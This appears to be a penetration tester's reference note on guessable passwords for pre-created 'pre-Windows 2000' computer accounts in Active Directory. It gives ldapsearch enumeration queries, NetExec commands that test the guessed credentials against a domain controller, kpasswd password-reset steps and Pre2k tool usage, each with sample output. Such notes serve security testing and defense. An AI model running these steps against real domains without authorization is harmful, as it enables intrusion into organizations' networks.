---
Primary_category: "[[WINDOWS CREDENTIALS]]"
title: "WINDOWS PREDICTABLE CREDENTIALS"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS CREDENTIALS]]

#### *Theory*

It refers to credentials whose value can be infered from known information, *Naming Convention* or inherited settings

---

#### *Pre-Windows 2000 Computer Accounts*

> ***Pre2k Computer Accounts***

##### *Theory*

When a computer account is pre-created on an *Active Directory* environment, an operator could select the *Assign this computer account as a pre-Windows 2000 computer*

![[WINDOWS PREDICTABLE CREDENTIALS-20260718204211568.webp|250]]

> ***Zoom in***

If so, its password is not generated randomly, as is usually the case, but rather it becomes the name of the computer itself

> ***e.g.***

```bash
samAccountName: WKS99$
password: wks99
```

As shown above, the password follows the pattern below

- ***Computer Account's*** **`samAccountName`** ***attribute***

- ***It's converted to lowercase***

- ***The trailing `$` is trimmed***

This feature basically provides a fairly simple entry point into *AD* for getting started with authenticated enumeration

##### *Enumeration*

We must look for any of the following **`userAccountControl`** flags →

> ***WORKSTATION_TRUST_ACCOUNT → 4096***

> ***[[WINDOWS PASSWD_NOTREQD|PASSWD_NOTREQD]] → 32***

- ***[LDAPsearch](https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html)***

***WORKSTATION_TRUST_ACCOUNT + PASSWD_NOTREQD***

```bash
ldapsearch -LLL -Y GSSAPI -H 'ldap://<DC_FQDN>' -b 'DC=<DOMAIN>,DC=<TLD>' '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=4096)(userAccountControl:1.2.840.113556.1.4.803:=32))' samAccountName primaryGroupID memberof
```

***WORKSTATION_TRUST_ACCOUNT*** **`OR`** ***PASSWD_NOTREQD***

```bash
ldapsearch -LLL -Y GSSAPI -H 'ldap://<DC_FQDN>' -b 'DC=<DOMAIN>,DC=<TLD>' '(&(objectCategory=computer)(|(userAccountControl:1.2.840.113556.1.4.803:=4096)(userAccountControl:1.2.840.113556.1.4.803:=32)))' samAccountName primaryGroupID memberof
```

##### *Validation*

- ***[Netexec](https://github.com/Pennyw0rth/NetExec)***

```bash
nxc smb '<DC>' --username '<COMPUTER_ACCOUNT>$' --password '<PASSWD>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> nxc smb DC01.DOMAIN.INTERNAL --username 'WKS99$' --password 'wks99'
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> SMB         DC01.DOMAIN.INTERNAL 445    DC01             [*]  x64 (name:DC01) (domain:DOMAIN.INTERNAL) (signing:True) (SMBv1:None) (NTLM:True)
> SMB         DC01.DOMAIN.INTERNAL 445    DC01             [+] DOMAIN.INTERNAL\WKS99$:wks99
> ```
>

###### *STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT*

We may encounter the following error when trying to authenticate to the *DC* using valid credentials for the *Pre2K* computer account

If so, it means that the computer account has not been used yet

```bash
nxc smb '<DC>' --username '<COMPUTER_ACCOUNT>$' --password '<PASSWD>'
```

> [!TLDR]- *Expected Output*
>
> ```bash
> SMB         192.168.1.100   445    DC01.DOMAIN.INTERNAL             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:DOMAIN.INTERNAL) (signing:True) (SMBv1:None) (NTLM:True)
> SMB         192.168.1.100   445    DC01.DOMAIN.INTERNAL             [-] DOMAIN.INTERNAL\WKS99$:wks99 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
> ```
>

To solve this problem and be able to authenticate with the given computer account correctly, we just have to change its password

To do so, we can leverage *Kerberos* and the *464 TCP port*, related to *KPASSWD*, as follows

> ***DOMAIN.TLD always in uppercase***

```bash
kpasswd '<COMPUTER_ACCOUNT$>'@<DOMAIN>.<TLD>
```

> [!DANGER]- *e.g.*
>
> ```bash
> kpasswd 'WKS99$@DOMAIN.INTERNAL'
> ```
>

Then, try to authenticate again to the *DC* using the new password

##### *Automated Process*

In addition to the previous manual enumeration, we can use several tools that automate the entire process

> ***Enumeration → Validation***

- ***[Pre2k](https://github.com/garrettfoster13/pre2k)***

***Setup***

```bash
git clone https://github.com/garrettfoster13/pre2k Pre2k
cd !$ && python3 -m venv .venv
. !$/bin/activate && pip3 install .
```

***Usage***

```bash
pre2k auth -u '<USER>' -p '<PASSWD>' -d '<DOMAIN>' -dc-ip '<DC_IP>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> pre2k auth -u 'john.doe' -p 'password1234$!' -d 'DOMAIN.INTERNAL' -dc-ip 10.10.10.15
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> [21:21:45] INFO     Retrieved 3 results total.                                                                           
> [21:21:45] INFO     Testing started at 2026-07-18 21:21:45                                                               
> [21:21:45] INFO     Using 10 threads                                                                                     
> [21:21:46] INFO     VALID CREDENTIALS: DOMAIN.INTERNAL\WKS99$:wks99                                                           
> ```
>

##### *Resources*

***[TrustedSec: Diving into Pre-Created Computer Accounts](https://trustedsec.com/blog/diving-into-pre-created-computer-accounts)***

***[Semperis: Security Risks Pre-Windows 2000](https://www.semperis.com/blog/security-risks-pre-windows-2000-compatibility-windows-2022/)***

***[Hacking Articles: Pre2k AD Misconfigurations](https://www.hackingarticles.in/pre2k-active-directory-misconfigurations/)***